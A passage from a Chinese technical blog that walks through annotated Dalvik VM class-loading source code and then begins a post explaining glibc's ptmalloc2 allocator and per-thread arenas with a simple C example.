class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ClassObject* <span class="title">findClassNoInit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* descriptor, Object* loader,</span></span></span><br><span class="line"><span class="function"><span class="params">    DvmDex* pDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Thread* self = dvmThreadSelf();</span><br><span class="line">    ClassObject* clazz; <span class="comment">// 类加载的最终形式</span></span><br><span class="line">    <span class="keyword">bool</span> profilerNotified = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/* 判断目标类是否有类加载器，对于系统类，虚拟机将从默认的启动路径实现其加载工作</span></span><br><span class="line"><span class="comment">    对于用户类，虚拟机一般情况下使用默认的类加载器实现类加载工作 */</span></span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LOGVV(<span class="string">&quot;#### findClassNoInit(%s,%p,%p)&quot;</span>, descriptor, loader,</span><br><span class="line">            pDvmDex-&gt;pDexFile);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">/* 根据目标类的描述符从hash表(系统已加载类)里查找是否已经有该Class的信息，如果已经加载，则返回</span></span><br><span class="line"><span class="comment">    其ClassObject对象，否则，对目标类进行加载*/</span></span><br><span class="line">    clazz = dvmLookupClass(descriptor, loader, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> DexClassDef* pClassDef;</span><br><span class="line"></span><br><span class="line">        dvmMethodTraceClassPrepBegin();</span><br><span class="line">        profilerNotified = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> LOG_CLASS_LOADING</span></span><br><span class="line">        u8 startTime = dvmGetThreadCpuTimeNsec();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 判断是否存在DvmDex结构体对象，如果存在，则表示目标类为一个用户类，将从一个解析的Dex文件</span></span><br><span class="line"><span class="comment">        中进行加载，对于一个解析过的Dex文件，是一定存在一个DvmDex结构体对象的，故pDvmDex一定不为空</span></span><br><span class="line"><span class="comment">        若为空，则表示目标类是一个系统类，虚拟机将调用searchBootPathForClass函数从启动路径下查找并</span></span><br><span class="line"><span class="comment">        加载目标类 */</span></span><br><span class="line">        <span class="keyword">if</span> (pDvmDex == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            assert(loader == <span class="literal">NULL</span>);     <span class="comment">/* shouldn&#x27;t be here otherwise */</span></span><br><span class="line">            <span class="comment">/* 从BOOTCLASSPATH里那一堆jar包文件中，看看哪个jar包声明了目标类返回的是一个打开了的代</span></span><br><span class="line"><span class="comment">            表odex文件的DvmDex对象 */</span></span><br><span class="line">            pDvmDex = searchBootPathForClass(descriptor, &amp;pClassDef);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 查找目标类的类定义资源</span></span><br><span class="line">            pClassDef = dexFindClass(pDvmDex-&gt;pDexFile, descriptor);</span><br><span class="line">        &#125;</span><br><span class="line">	...</span><br><span class="line">        <span class="comment">/* 当获得了加载目标类所需的各项资源，主函数将调用loadClassFromDex函数对目标类进行加载 */</span></span><br><span class="line">        clazz = loadClassFromDex(pDvmDex, pClassDef, loader);</span><br><span class="line">        <span class="keyword">if</span> (dvmCheckException(self)) &#123;</span><br><span class="line">            <span class="comment">/* class was found but had issues */</span></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                dvmFreeClassInnards(clazz);</span><br><span class="line">                dvmReleaseTrackedAlloc((Object*) clazz, <span class="literal">NULL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 将目前使用的类锁住，防止其他进程更改 */</span></span><br><span class="line">        dvmLockObject(self, (Object*) clazz);</span><br><span class="line">        clazz-&gt;initThreadId = self-&gt;threadId;</span><br><span class="line">        </span><br><span class="line">        assert(clazz-&gt;classLoader == loader);</span><br><span class="line">        <span class="keyword">if</span> (!dvmAddClassToHash(clazz)) &#123; <span class="comment">// class对象加到Hash表里</span></span><br><span class="line">	        clazz-&gt;initThreadId = <span class="number">0</span>;</span><br><span class="line">            dvmUnlockObject(self, (Object*) clazz);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Let the GC free the class. */</span></span><br><span class="line">            dvmFreeClassInnards(clazz);</span><br><span class="line">            dvmReleaseTrackedAlloc((Object*) clazz, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">/* 从已加载的类的系统Hash表中重新得到类 */</span></span><br><span class="line">            clazz = dvmLookupClass(descriptor, loader, <span class="literal">true</span>);</span><br><span class="line">            assert(clazz != <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">goto</span> got_class;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 准备开始连接类，对clazz进行一些处理：</span></span><br><span class="line"><span class="comment">         * 1.解析ClassObject对象的基类信息，和它实现了那些接口</span></span><br><span class="line"><span class="comment">         * 2.校验：比如父类是final的，那么就不应该有它的派生类等</span></span><br><span class="line"><span class="comment">         * 此函数调用成功后，clazz的状态将是CLASS_RESOLVED或CLASS_VERIFIED</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!dvmLinkClass(clazz)) &#123;</span><br><span class="line">            assert(dvmCheckException(self));</span><br><span class="line">            <span class="comment">/* Make note of the error and clean up the class. */</span></span><br><span class="line">            removeClassFromHash(clazz);</span><br><span class="line">            clazz-&gt;status = CLASS_ERROR;</span><br><span class="line">            dvmFreeClassInnards(clazz);</span><br><span class="line">            <span class="comment">/* Let any waiters know. */</span></span><br><span class="line">            clazz-&gt;initThreadId = <span class="number">0</span>;</span><br><span class="line">            dvmObjectNotifyAll(self, (Object*) clazz);</span><br><span class="line">            dvmUnlockObject(self, (Object*) clazz);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 将类的状态增加到全局变量中去 */</span></span><br><span class="line">        gDvm.numLoadedClasses++;</span><br><span class="line">        gDvm.numDeclaredMethods +=</span><br><span class="line">            clazz-&gt;virtualMethodCount + clazz-&gt;directMethodCount;</span><br><span class="line">        gDvm.numDeclaredInstFields += clazz-&gt;ifieldCount;</span><br><span class="line">        gDvm.numDeclaredStaticFields += clazz-&gt;sfieldCount;</span><br><span class="line">        ...</span><br><span class="line">    <span class="comment">/* check some invariants */</span></span><br><span class="line">    assert(dvmIsClassLinked(clazz));</span><br><span class="line">    assert(gDvm.classJavaLangClass != <span class="literal">NULL</span>);</span><br><span class="line">    assert(clazz-&gt;clazz == gDvm.classJavaLangClass);</span><br><span class="line">    assert(dvmIsClassObject(clazz));</span><br><span class="line">    assert(clazz == gDvm.classJavaLangObject || clazz-&gt;super != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dvmIsInterfaceClass(clazz)) &#123;</span><br><span class="line">        <span class="comment">//ALOGI(&quot;class=%s vtableCount=%d, virtualMeth=%d&quot;,</span></span><br><span class="line">        <span class="comment">//    clazz-&gt;descriptor, clazz-&gt;vtableCount,</span></span><br><span class="line">        <span class="comment">//    clazz-&gt;virtualMethodCount);</span></span><br><span class="line">        assert(clazz-&gt;vtableCount &gt;= clazz-&gt;virtualMethodCount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">bail:</span><br><span class="line">    <span class="keyword">if</span> (profilerNotified)</span><br><span class="line">        dvmMethodTraceClassPrepEnd();</span><br><span class="line">    assert(clazz != <span class="literal">NULL</span> || dvmCheckException(self));</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用dvmLookupClass函数判断本类是否已经被加载</p>
<ul>
<li>已加载：直接使用，结束函数。</li>
<li>未加载：判断能否找到Dex文件，能找到调用<code>dexFindClass</code>在指定Dex文件中根据类的描述符查找相关类（用户类）；找不到调用<code>searchBootPathForClass</code>从系统启动基本路径中查找并加载目标类（系统类）。调用loadClassFromDex函数实现加载类达到可运行状态。调用dvmAddClassToHash实现将新加载的类添加到哈希表中方便在此查找。</li>
</ul>
<p>findClassNoInit函数将调用<code>loadClassFromDex0</code>函数完成对该类的加载工作，返回值为一个<code>ClassObject</code>结构体对象。loadClassFromDex0函数源代码如下：<br><strong>代码清单</strong> dalvik/vm/oo/Class.cpp: loadClassFromDex0()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ClassObject* <span class="title">loadClassFromDex0</span><span class="params">(DvmDex* pDvmDex,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> DexClassDef* pClassDef, <span class="keyword">const</span> DexClassDataHeader* pHeader,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> u1* pEncodedData, Object* classLoader)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ClassObject* newClass = <span class="literal">NULL</span>; <span class="comment">// 目标类的类实例对象</span></span><br><span class="line">    <span class="keyword">const</span> DexFile* pDexFile;      <span class="comment">// 用于存储目标Dex文件所对应的DexFile数据结构实例对象</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* descriptor;       <span class="comment">// 用于存储目标类的描述符</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">// 获取相应的类信息</span></span><br><span class="line">    pDexFile = pDvmDex-&gt;pDexFile;</span><br><span class="line">    descriptor = dexGetClassDescriptor(pDexFile, pClassDef);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 为即将生成的类对象实例申请内存空间</span></span><br><span class="line">    assert(descriptor != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 判断是不是java.lang.Class类，此类已经初始化过了</span></span><br><span class="line">    <span class="keyword">if</span> (classLoader == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">strcmp</span>(descriptor, <span class="string">&quot;Ljava/lang/Class;&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        assert(gDvm.classJavaLangClass != <span class="literal">NULL</span>);</span><br><span class="line">        newClass = gDvm.classJavaLangClass;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 取得对象实例大小并在内存中申请相应内存</span></span><br><span class="line">        <span class="keyword">size_t</span> size = classObjectSize(pHeader-&gt;staticFieldsSize);</span><br><span class="line">        newClass = (ClassObject*) dvmMalloc(size, ALLOC_NON_MOVING);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newClass == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对新的类对象实例进行初始化</span></span><br><span class="line">    DVM_OBJECT_INIT(newClass, gDvm.classJavaLangClass);</span><br><span class="line">    dvmSetClassSerialNumber(newClass);</span><br><span class="line">    newClass-&gt;descriptor = descriptor;</span><br><span class="line">    assert(newClass-&gt;descriptorAlloc == <span class="literal">NULL</span>);</span><br><span class="line">    SET_CLASS_FLAG(newClass, pClassDef-&gt;accessFlags);</span><br><span class="line">    <span class="comment">// 设定字段对象</span></span><br><span class="line">    dvmSetFieldObject((Object *)newClass,</span><br><span class="line">                      OFFSETOF_MEMBER(ClassObject, classLoader),</span><br><span class="line">                      (Object *)classLoader);</span><br><span class="line">    <span class="comment">// 设定类的相关指针</span></span><br><span class="line">    newClass-&gt;pDvmDex = pDvmDex;</span><br><span class="line">    newClass-&gt;primitiveType = PRIM_NOT;</span><br><span class="line">    newClass-&gt;status = CLASS_IDX;</span><br><span class="line">    <span class="comment">// 将这个类的父类的索引加入到类对象的指针区域</span></span><br><span class="line">    assert(<span class="keyword">sizeof</span>(u4) == <span class="keyword">sizeof</span>(ClassObject*)); <span class="comment">/* 32-bit check */</span></span><br><span class="line">    newClass-&gt;super = (ClassObject*) pClassDef-&gt;superclassIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> DexTypeList* pInterfacesList;</span><br><span class="line">    <span class="comment">// 得到接口列表</span></span><br><span class="line">    pInterfacesList = dexGetInterfacesList(pDexFile, pClassDef);</span><br><span class="line">    <span class="keyword">if</span> (pInterfacesList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        newClass-&gt;interfaceCount = pInterfacesList-&gt;size;</span><br><span class="line">        newClass-&gt;interfaces = (ClassObject**) dvmLinearAlloc(classLoader,</span><br><span class="line">                newClass-&gt;interfaceCount * <span class="keyword">sizeof</span>(ClassObject*));</span><br><span class="line">        <span class="comment">// newClass实现了哪些接口类，此处也先以接口类的index存储，后续放到dvmLinkClass来解析</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; newClass-&gt;interfaceCount; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> DexTypeItem* pType = dexGetTypeItem(pInterfacesList, i);</span><br><span class="line">            newClass-&gt;interfaces[i] = (ClassObject*)(u4) pType-&gt;typeIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        dvmLinearReadOnly(classLoader, newClass-&gt;interfaces);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对字段进行加载，首先加载静态字段</span></span><br><span class="line">    <span class="keyword">if</span> (pHeader-&gt;staticFieldsSize != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* static fields stay on system heap; field data isn&#x27;t &quot;write once&quot; */</span></span><br><span class="line">        <span class="keyword">int</span> count = (<span class="keyword">int</span>) pHeader-&gt;staticFieldsSize;</span><br><span class="line">        u4 lastIndex = <span class="number">0</span>;</span><br><span class="line">        DexField field;</span><br><span class="line">        <span class="comment">// 取得字段数</span></span><br><span class="line">        newClass-&gt;sfieldCount = count;</span><br><span class="line">        <span class="comment">// 逐一加载字段</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            dexReadClassDataField(&amp;pEncodedData, &amp;field, &amp;lastIndex);</span><br><span class="line">            <span class="comment">// 解析newClass定义的静态成员信息</span></span><br><span class="line">            loadSFieldFromDex(newClass, &amp;field, &amp;newClass-&gt;sfields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加载实例字段</span></span><br><span class="line">    <span class="keyword">if</span> (pHeader-&gt;instanceFieldsSize != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = (<span class="keyword">int</span>) pHeader-&gt;instanceFieldsSize;</span><br><span class="line">        u4 lastIndex = <span class="number">0</span>;</span><br><span class="line">        DexField field;</span><br><span class="line">        <span class="comment">// 取得字段数</span></span><br><span class="line">        newClass-&gt;ifieldCount = count;</span><br><span class="line">        newClass-&gt;ifields = (InstField*) dvmLinearAlloc(classLoader,</span><br><span class="line">                count * <span class="keyword">sizeof</span>(InstField));</span><br><span class="line">        <span class="comment">// 逐一加载字段</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            dexReadClassDataField(&amp;pEncodedData, &amp;field, &amp;lastIndex);</span><br><span class="line">            loadIFieldFromDex(newClass, &amp;field, &amp;newClass-&gt;ifields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        dvmLinearReadOnly(classLoader, newClass-&gt;ifields);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对类方法进行加载</span></span><br><span class="line">    <span class="keyword">if</span> (pHeader-&gt;directMethodsSize != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = (<span class="keyword">int</span>) pHeader-&gt;directMethodsSize;</span><br><span class="line">        u4 lastIndex = <span class="number">0</span>;</span><br><span class="line">        DexMethod method;</span><br><span class="line">        <span class="comment">// 取得方法数目</span></span><br><span class="line">        newClass-&gt;directMethodCount = count;</span><br><span class="line">        newClass-&gt;directMethods = (Method*) dvmLinearAlloc(classLoader,</span><br><span class="line">                count * <span class="keyword">sizeof</span>(Method));</span><br><span class="line">        <span class="comment">// 逐一加载方法</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            dexReadClassDataMethod(&amp;pEncodedData, &amp;method, &amp;lastIndex);</span><br><span class="line">            loadMethodFromDex(newClass, &amp;method, &amp;newClass-&gt;directMethods[i]);</span><br><span class="line">            <span class="keyword">if</span> (classMapData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> RegisterMap* pMap = dvmRegisterMapGetNext(&amp;classMapData);</span><br><span class="line">                <span class="keyword">if</span> (dvmRegisterMapGetFormat(pMap) != kRegMapFormatNone) &#123;</span><br><span class="line">                    newClass-&gt;directMethods[i].registerMap = pMap;</span><br><span class="line">                    <span class="comment">/* <span class="doctag">TODO:</span> add rigorous checks */</span></span><br><span class="line">                    assert((newClass-&gt;directMethods[i].registersSize+<span class="number">7</span>) / <span class="number">8</span> ==</span><br><span class="line">                        newClass-&gt;directMethods[i].registerMap-&gt;regWidth);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dvmLinearReadOnly(classLoader, newClass-&gt;directMethods);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加载虚方法</span></span><br><span class="line">    <span class="keyword">if</span> (pHeader-&gt;virtualMethodsSize != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = (<span class="keyword">int</span>) pHeader-&gt;virtualMethodsSize;</span><br><span class="line">        u4 lastIndex = <span class="number">0</span>;</span><br><span class="line">        DexMethod method;</span><br><span class="line">        <span class="comment">// 取得虚方法数目</span></span><br><span class="line">        newClass-&gt;virtualMethodCount = count;</span><br><span class="line">        newClass-&gt;virtualMethods = (Method*) dvmLinearAlloc(classLoader,</span><br><span class="line">                count * <span class="keyword">sizeof</span>(Method));</span><br><span class="line">        <span class="comment">// 逐一处理方法</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            dexReadClassDataMethod(&amp;pEncodedData, &amp;method, &amp;lastIndex);</span><br><span class="line">            loadMethodFromDex(newClass, &amp;method, &amp;newClass-&gt;virtualMethods[i]);</span><br><span class="line">            <span class="keyword">if</span> (classMapData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> RegisterMap* pMap = dvmRegisterMapGetNext(&amp;classMapData);</span><br><span class="line">                <span class="keyword">if</span> (dvmRegisterMapGetFormat(pMap) != kRegMapFormatNone) &#123;</span><br><span class="line">                    newClass-&gt;virtualMethods[i].registerMap = pMap;</span><br><span class="line">                    <span class="comment">/* <span class="doctag">TODO:</span> add rigorous checks */</span></span><br><span class="line">                    assert((newClass-&gt;virtualMethods[i].registersSize+<span class="number">7</span>) / <span class="number">8</span> ==</span><br><span class="line">                        newClass-&gt;virtualMethods[i].registerMap-&gt;regWidth);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dvmLinearReadOnly(classLoader, newClass-&gt;virtualMethods);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存源文件信息</span></span><br><span class="line">    newClass-&gt;sourceFile = dexGetSourceFile(pDexFile, pClassDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* caller must call dvmReleaseTrackedAlloc */</span></span><br><span class="line">    <span class="keyword">return</span> newClass; <span class="comment">// 返回类对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依次完成：1.在内存中为类对象申请存储空间；2.设置字段信息；3.为超类建立索引；4.加载类接口；5.加载类字段；6.加载类方法，并将以上数据封装成一个ClassObject结构体对象并返回。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/" class="post-title-link" itemprop="url">深入理解glibc malloc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-11 09:08:38" itemprop="dateCreated datePublished" datetime="2016-04-11T09:08:38+08:00">2016-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>glibc中的内存分配是由<code>ptmalloc2</code>实现的，ptmalloc2是dlmalloc（General purpose allocator）的分支，并加入了线程支持。<br><strong>System Calls</strong> malloc内部会调用<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/sbrk.2.html">brk</a>或<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>系统调用。<br><strong>Threading</strong> ptmalloc2中，当两个线程同时调用malloc，内存会立即得到分配，因为每个线程有一个单独的堆段，因此<code>free list</code>数据结构中保存的这些堆也是分开的。这种为每个线程分配一个单独的堆和free list数据结构的行为称为<code>per thread arena</code>。<br>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    <span class="keyword">void</span>* s;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 